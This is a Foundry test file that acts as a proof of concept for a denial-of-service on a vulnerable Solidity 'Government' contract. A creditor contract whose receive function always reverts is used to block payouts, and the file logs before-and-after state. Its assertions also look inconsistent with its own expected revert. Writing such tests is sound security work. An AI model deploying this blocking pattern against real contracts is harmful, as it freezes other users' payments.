// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/list_dos.sol";

contract MaliciousCreditor {
    receive() external payable {
        revert("Malicious contract blocking payments");
    }
}

contract GovernmentTest is Test {
    Government government;
    MaliciousCreditor maliciousCreditor;
    address honestUser = address(0x1);
    address corruptElite;

    function setUp() public {
        // Deploy Government contract with 1 ETH initial balance
        government = new Government{value: 1 ether}();
        corruptElite = government.corruptElite();
        
        // Deploy malicious creditor contract and fund it
        maliciousCreditor = new MaliciousCreditor();
        vm.deal(address(maliciousCreditor), 10 ether);
        
        // Fund honest user
        vm.deal(honestUser, 10 ether);
    }

    function testDenialOfServiceAttack() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 preCreditorsLength = government.getCreditorAddresses().length;
        uint256 preRound = government.round();
        uint256 preLastCreditorPayedOut = government.lastCreditorPayedOut();
        uint256 preProfitFromCrash = government.profitFromCrash();
        uint256 preGovBalance = address(government).balance;
        
        console.log("Pre-trigger creditors length:", preCreditorsLength);
        console.log("Pre-trigger round:", preRound);
        console.log("Pre-trigger lastCreditorPayedOut:", preLastCreditorPayedOut);
        console.log("Pre-trigger profitFromCrash:", preProfitFromCrash);
        console.log("Pre-trigger government balance:", preGovBalance);

        console.log("\n--- Trigger: Malicious creditors attack ---");
        // Step 1: Malicious creditor lends money to government
        vm.prank(address(maliciousCreditor));
        government.lendGovernmentMoney{value: 1 ether}(address(0));
        
        // Step 2: Honest user lends money to government
        vm.prank(honestUser);
        government.lendGovernmentMoney{value: 1 ether}(address(0));
        
        // Step 3: Advance time to allow payout
        vm.warp(block.timestamp + 12 hours + 1);
        
        // Step 4: Trigger payout via fallback (expect revert)
        vm.expectRevert();
        address(government).call{value: 1 wei}("");

        console.log("\n--- AFTER-Trigger State ---");
        uint256 postCreditorsLength = government.getCreditorAddresses().length;
        uint256 postRound = government.round();
        uint256 postLastCreditorPayedOut = government.lastCreditorPayedOut();
        uint256 postProfitFromCrash = government.profitFromCrash();
        uint256 postGovBalance = address(government).balance;
        
        console.log("Post-trigger creditors length:", postCreditorsLength);
        console.log("Post-trigger round:", postRound);
        console.log("Post-trigger lastCreditorPayedOut:", postLastCreditorPayedOut);
        console.log("Post-trigger profitFromCrash:", postProfitFromCrash);
        console.log("Post-trigger government balance:", postGovBalance);

        console.log("\n--- DIFFERENTIAL VERIFICATION ---");
        bool creditorsCleared = (preCreditorsLength == 2) && (postCreditorsLength == 0);
        bool roundIncreased = postRound == preRound + 1;
        bool paymentStuck = postLastCreditorPayedOut == 0;
        bool profitReset = postProfitFromCrash == 0;
        bool balanceIncreased = postGovBalance > preGovBalance;
        
        console.log("Creditors cleared (2 -> 0):", creditorsCleared ? "YES" : "NO");
        console.log("Round increased:", roundIncreased ? "YES" : "NO");
        console.log("Last creditor stuck:", paymentStuck ? "YES" : "NO");
        console.log("Profit reset to zero:", profitReset ? "YES" : "NO");
        console.log("Balance increased:", balanceIncreased ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (creditorsCleared && roundIncreased && paymentStuck && profitReset && balanceIncreased) {
            console.log("\nVulnerability Exists: Attack successfully caused accounting reset and stuck payments");
        } else {
            console.log("\nVulnerability not Exist: System maintained functional state");
        }
        
        // Additional sanity check
        assertEq(postCreditorsLength, 0, "Creditors list should be cleared");
    }
}